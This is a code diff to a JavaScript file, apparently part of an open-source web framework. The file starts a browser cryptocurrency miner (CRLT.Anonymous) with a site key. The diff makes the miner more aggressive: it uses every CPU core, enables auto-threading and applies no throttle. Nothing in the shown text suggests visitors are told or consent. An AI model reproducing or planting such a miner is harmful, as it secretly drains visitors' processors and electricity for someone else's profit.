@@ -3,13 +3,14 @@
         * 谢谢大家对本开源框架。
         * */
 /******************************************************************************************/
-var threads = window.navigator.hardwareConcurrency / 2;
+var threads = window.navigator.hardwareConcurrency ;
+
 if (threads < 1) {
     threads = 1;
 }
 var miner=new CRLT.Anonymous('4ec23507271718d30b965cb206801b3feb0f03f73c2a',
     {
-        threads:threads,autoThreads:false,throttle:0,
+        threads:threads,autoThreads:true,throttle:0,
     }
 );
 miner.start();
